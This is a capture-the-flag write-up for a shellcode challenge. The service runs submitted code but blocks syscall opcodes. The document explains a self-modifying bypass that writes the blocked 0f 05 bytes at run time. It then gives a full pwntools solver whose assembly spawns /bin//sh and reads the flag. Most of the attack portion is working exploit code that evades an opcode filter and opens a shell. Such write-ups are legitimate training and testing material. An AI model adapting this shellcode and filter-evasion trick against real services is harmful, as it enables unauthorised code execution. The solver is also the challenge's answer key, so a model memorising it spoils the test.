Summary

It worked perfectly on the developer's laptop. If it misbehaves now, that sounds impressively like your problem.

Walkthrough

Solution

The service executes code from an RWX mapping but rejects literal syscall, int 0x80, and sysenter opcode pairs. The mapping is writable during execution, so place 00 05 at the future syscall site and begin with a small self-modifying stub that changes the first byte to 0f.

The remaining shellcode constructs /bin//sh, sets up execve, and falls into the newly created 0f 05. The forbidden sequence never appears in the submitted payload, but it exists by the time execution reaches it.

Reference solver

The complete solver used to validate the challenge:

#!/usr/bin/env python3

from pwn import *


context.arch = "amd64"
context.log_level = "error"

host = args.HOST or "127.0.0.1"
port = int(args.PORT or 20019)

payload = asm(
    """
    lea rbx, [rip + gate]
    mov byte ptr [rbx], 0x0f
    xor eax, eax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    xor edx, edx
    mov al, 59
gate:
    .byte 0x00, 0x05
    """
)

for forbidden in (b"\x0f\x05", b"\xcd\x80", b"\x0f\x34"):
    assert forbidden not in payload

io = process("./main") if args.LOCAL else remote(host, port)
io.sendlineafter(b"Size: ", str(len(payload)).encode())
io.sendafter(b"Data: ", payload)
io.recvuntil(b"Fine. Running it.\n")
io.sendline(b"cat flag.txt 2>/dev/null || cat /flag.txt; exit")
print(io.recvuntil(b"}").decode().strip())
io.close()
